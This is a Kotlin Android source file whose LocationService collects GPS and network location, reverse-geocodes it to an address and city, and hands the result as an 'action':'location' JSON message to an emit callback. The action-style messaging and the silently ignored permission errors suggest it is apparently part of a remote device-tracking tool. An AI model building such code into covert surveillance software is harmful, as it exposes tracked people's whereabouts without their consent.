package com.app.cyber

import android.content.Context
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import org.json.JSONObject
import java.util.Locale

object LocationService {

    private var lastLoc: Location? = null

    fun start(ctx: Context) {
        try {
            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            val listener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    lastLoc = loc
                }
                override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
                override fun onProviderEnabled(p: String) {}
                override fun onProviderDisabled(p: String) {}
            }
            
            try {
                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000L, 5f, listener)
            } catch (_: SecurityException) {}
            
            try {
                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 10000L, 5f, listener)
            } catch (_: SecurityException) {}
            
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun sendLast(ctx: Context, emit: (JSONObject) -> Unit) {
        val loc = lastLoc
        val obj = JSONObject()
        obj.put("action", "location")
        
        if (loc != null) {
            obj.put("lat", loc.latitude)
            obj.put("lng", loc.longitude)
            try {
                val geocoder = Geocoder(ctx, Locale.getDefault())
                val addresses = geocoder.getFromLocation(loc.latitude, loc.longitude, 1)
                if (addresses != null && addresses.isNotEmpty()) {
                    obj.put("address", addresses[0].getAddressLine(0) ?: "-")
                    obj.put("city", addresses[0].locality ?: "-")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        } else {
            obj.put("lat", 0.0)
            obj.put("lng", 0.0)
            obj.put("address", "Menunggu GPS...")
            obj.put("city", "-")
        }
        
        emit(obj)
    }
}
